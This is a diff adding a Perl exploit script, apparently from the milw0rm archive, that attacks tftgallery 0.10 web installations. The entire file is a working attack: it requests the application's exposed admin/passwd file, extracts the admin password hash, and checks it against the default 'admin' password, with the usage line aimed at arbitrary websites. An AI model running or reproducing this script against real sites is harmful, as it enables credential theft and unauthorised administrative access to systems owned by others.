@@ -1,0 +1,107 @@
+#!/usr/bin/perl
+
+###############################################################################
+#Copyright (C) undefined1_
+#
+#This program is free software; you can redistribute it and/or
+#modify it under the terms of the GNU General Public License
+#as published by the Free Software Foundation; either version 2
+#of the License, or (at your option) any later version.
+#
+#This program is distributed in the hope that it will be useful,
+#but WITHOUT ANY WARRANTY; without even the implied warranty of
+#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#GNU General Public License for more details.
+#
+#You should have received a copy of the GNU General Public License
+#along with this program; if not, write to the Free Software
+#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+#
+###############################################################################
+
+use strict; 
+use IO::Socket;
+
+$| = 1;
+printf ":: tftgallery 0.10 exploit - by undefined1_ @ bash-x.net/undef/ ::\n\n\n";
+
+
+my $website = shift || usage();
+
+my $path = "/";
+my $site = $website;
+if(index($website, "/") != -1)
+{
+	my $index = index($website, "/");
+	$path = substr($website, $index);
+	$site = substr($website, 0, $index);
+	if(substr($path, length($path)-1) ne "/")
+	{
+		$path .= "/";
+	}
+}
+
+
+my $eop = "\r\nHost: $site\r\n";
+$eop .= "User-Agent: Mozilla/5.0\r\n";
+$eop .= "Connection: close\r\n\r\n";
+
+
+my $packet1 = "GET ".$path."admin/passwd HTTP/1.1";
+my $data = sendpacket($site, $packet1.$eop);
+
+if($data !~ /HTTP\/1.1 200 OK/)
+{
+	die "failed to retrieve the admin password\n";
+}
+
+my $password = "";
+if (index($data, "\r\n\r\n") != -1)
+{
+	$password = substr($data, index($data, "\r\n\r\n")+4);
+	chomp $password;
+}
+else
+{
+	die "failed to retrieve the admin password\n";
+}
+
+print "The password hash is: '$password'\n";
+if(crypt("admin","tftgallery") eq $password)
+{
+	print "The plaintext password is: 'admin'\n";		
+}
+else
+{
+	die "Use john the ripper, luke!\n";
+}
+
+
+
+
+sub sendpacket(\$,\$) {
+	my $server = shift;
+	my $request = shift;
+
+	my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $server, PeerPort => "80") or die "[-] Could not connect to $server:80 $!\n";
+	print $sock "$request";
+
+	
+	my $data = "";
+	my $answer;
+	while($answer = <$sock>)
+	{
+		$data .= $answer;
+	}
+	
+	close($sock);
+	return $data;
+}
+
+sub usage() {
+	printf "usage: %s <website> [password]\n", $0;
+	printf "ex. : %s www.site.com/tftgallery/\n", $0;
+	exit;
+}
+
+# milw0rm.com [2006-03-25]
